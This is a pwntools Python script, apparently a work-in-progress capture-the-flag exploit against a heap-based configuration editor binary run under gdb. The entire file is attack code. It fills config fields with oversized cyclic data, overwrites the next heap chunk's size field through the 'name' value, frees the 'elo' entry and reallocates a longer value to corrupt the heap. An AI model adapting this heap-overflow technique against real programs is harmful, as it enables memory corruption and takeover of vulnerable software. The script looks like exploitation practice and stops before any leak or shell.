from pwn import *

bn = "./editeur-de-configuration"
elf = ELF(bn)

mode = "debug"
# context.log_level = "debug"
context.binary = elf

if mode == "debug":
    p = gdb.debug(bn, """
    b realloc@plt
    c""")

def import_config():
    p.sendafter(b"> ", b"1\n")
    p.sendafter(b"> ", b"""[PLAYER]
elo=elo""" + cyclic(0x200 - 0x10 - 1) + b"""
name=name""" + cyclic(0x200 - 0x10 - 1) + b"""
team=team""" + cyclic(0x200 - 0x10 - 1) + b"""
token=token""" + cyclic(0x200 - 0x10 - 1) + b"""

""")

# b"""[PLAYER]
# elo=deadbeef
# token=""" + cyclic(0x1f0 - 0x10 -1) + b"""
# team=""" + cyclic(0x1f0 - 0x10 -1) + b"""
# name=12345678
# 
# """)

def add_config(key, value):
    p.sendafter(b"> ", b"2\n")
    p.sendafter(b"> ", b"1\n")
    p.send(key + b"=" + value + b"\n\n")
    p.sendafter(b"> ", b"4\n")

def del_config(key):
    p.sendafter(b"> ", b"2\n")
    p.sendafter(b"> ", b"2\n")
    p.send(key + b"\n\n")
    p.sendafter(b"> ", b"4\n")


def mod_config(key, value):
    p.sendafter(b"> ", b"2\n")
    p.sendafter(b"> ", b"3\n")
    p.send(key + b"=" + value + b"\n\n")
    p.sendafter(b"> ", b"4\n")

def pe():
    input("Press enter to continue...")

import_config()

log.info("Overwrite following chunk (should be elo) with size 0")
pe()
# Size of chunck for team should be 0x1F0 | 0x1
mod_config(b"name", b"name____" + cyclic(0x200-0x10))
# Size of chunck for team should be 0x1F0 | 0x0

#pe()
# mod_config(b"name", b"namename" + cyclic(0x500-0x20))

log.info("Deleteing elo")
pe()
del_config(b"elo")

#pe()
#add_config(b"name", cyclic(0x200))
log.info("Reallocate a longer value for name")
pe()
mod_config(b"name", b"nameXXXX" + cyclic(0x200-0x10 + 0x8))

p.interactive()

